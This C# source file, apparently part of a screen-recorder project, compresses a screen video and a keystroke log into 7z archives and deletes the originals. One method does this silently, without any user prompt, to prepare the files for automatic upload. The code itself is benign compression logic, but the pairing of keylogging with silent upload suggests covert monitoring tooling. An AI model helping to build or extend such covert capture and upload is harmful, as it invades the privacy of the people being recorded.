using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using SevenZip;
using System.Drawing;
namespace ScreenRecorder
{
    /// <summary>
    /// 文件压缩工具类，负责文件压缩相关功能
    /// </summary>
    public class FileCompressor
    {
        private string sevenZipLibraryPath = string.Empty;

        public FileCompressor()
        {
            // 初始化SevenZipSharp库
            sevenZipLibraryPath = FindSevenZipLibrary();
            SevenZipCompressor.SetLibraryPath(sevenZipLibraryPath);
        }

        /// <summary>
        /// 查找7z库文件
        /// </summary>
        private string FindSevenZipLibrary()
        {
            string[] possiblePaths = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.dll"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "7-Zip", "7z.dll")
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
            }

            throw new FileNotFoundException("未找到7z.dll库文件！请先安装7-Zip。");
        }

        /// <summary>
        /// 压缩文件方法（带用户交互）
        /// </summary>
        /// <param name="videoFilePath">视频文件路径</param>
        /// <param name="keylogFilePath">键盘记录文件路径</param>
        /// <returns>压缩文件路径</returns>
        public string CompressFiles(string videoFilePath, string? keylogFilePath = null)
        {
            try
            {
                // 创建压缩文件路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string zipFilePath = Path.Combine(Path.GetDirectoryName(videoFilePath), "ScreenCapture_" + timestamp + ".7z");

                // 准备文件列表
                List<string> filesToCompress = new List<string> { videoFilePath };
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    filesToCompress.Add(keylogFilePath);
                }

                // 计算原始大小
                long originalSize = 0;
                if (File.Exists(videoFilePath))
                {
                    originalSize += new FileInfo(videoFilePath).Length;
                }
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    originalSize += new FileInfo(keylogFilePath).Length;
                }

                // 创建SevenZipCompressor实例并设置最大压缩率
                SevenZipCompressor compressor = new SevenZipCompressor();
                compressor.CompressionLevel = SevenZip.CompressionLevel.Ultra;
                compressor.CompressionMethod = SevenZip.CompressionMethod.Lzma2;
                compressor.CompressionMode = SevenZip.CompressionMode.Create;

                // 显示压缩进度
                using (Form progressForm = new Form())
                {
                    progressForm.Text = "正在压缩文件...";
                    progressForm.ClientSize = new Size(300, 100);
                    progressForm.StartPosition = FormStartPosition.CenterParent;
                    progressForm.ControlBox = false;

                    ProgressBar progressBar = new ProgressBar();
                    progressBar.Location = new Point(20, 20);
                    progressBar.Width = 260;
                    progressBar.Style = ProgressBarStyle.Marquee;

                    Label label = new Label();
                    label.Text = "正在准备...";
                    label.Location = new Point(20, 50);
                    label.AutoSize = true;

                    progressForm.Controls.Add(progressBar);
                    progressForm.Controls.Add(label);

                    // 显示进度窗口
                    progressForm.Show();
                    Application.DoEvents();

                    // 使用SevenZipSharp压缩文件
                    compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());

                    progressForm.Close();
                }

                // 检查压缩是否成功
                if (!File.Exists(zipFilePath))
                {
                    MessageBox.Show("压缩失败，未生成压缩文件！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return string.Empty;
                }

                // 删除原文件
                try
                {
                    foreach (string fileToDelete in filesToCompress)
                    {
                        if (File.Exists(fileToDelete))
                        {
                            File.Delete(fileToDelete);
                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("删除原文件时出错: " + ex.Message, "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }

                // 显示压缩成功信息
                long compressedSize = new FileInfo(zipFilePath).Length;
                double compressionRatio = (double)compressedSize / originalSize * 100;

                MessageBox.Show("文件压缩成功！\n\n压缩文件保存在: " + zipFilePath + "\n原始大小: " + (originalSize / 1024.0 / 1024.0).ToString("F2") + " MB\n压缩大小: " + (compressedSize / 1024.0 / 1024.0).ToString("F2") + " MB\n压缩率: " + compressionRatio.ToString("F2") + "%", "压缩成功", MessageBoxButtons.OK, MessageBoxIcon.Information);

                return zipFilePath;
            }
            catch (Exception ex)
            {
                MessageBox.Show("压缩文件时出错: " + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }

        /// <summary>
        /// 自动上传的压缩方法（无用户交互）
        /// </summary>
        /// <param name="videoFilePath">视频文件路径</param>
        /// <param name="keylogFilePath">键盘记录文件路径</param>
        /// <returns>压缩文件路径</returns>
        public string CompressFilesForAutoUpload(string videoFilePath, string? keylogFilePath = null)
        {
            try
            {
                // 创建压缩文件路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string? directory = Path.GetDirectoryName(videoFilePath);
                string zipFilePath = directory != null ? Path.Combine(directory, "AutoUpload_ScreenCapture_" + timestamp + ".7z") : "AutoUpload_ScreenCapture_" + timestamp + ".7z";

                // 准备文件列表
                List<string> filesToCompress = new() { videoFilePath };
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    filesToCompress.Add(keylogFilePath);
                }

                // 创建SevenZipCompressor实例并设置最大压缩率
                SevenZipCompressor compressor = new()
                {
                    CompressionLevel = SevenZip.CompressionLevel.Ultra,
                    CompressionMethod = SevenZip.CompressionMethod.Lzma2,
                    CompressionMode = SevenZip.CompressionMode.Create
                };

                // 不显示进度窗口，直接压缩
                compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());

                // 检查压缩是否成功
                if (!File.Exists(zipFilePath))
                {
                    return string.Empty;
                }

                // 删除原文件
                try
                {
                    foreach (string fileToDelete in filesToCompress)
                    {
                        if (File.Exists(fileToDelete))
                        {
                            File.Delete(fileToDelete);
                        }
                    }
                }
                catch (Exception)
                {
                    // 自动上传过程中的错误不需要显示消息
                }

                return zipFilePath;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }
    }
}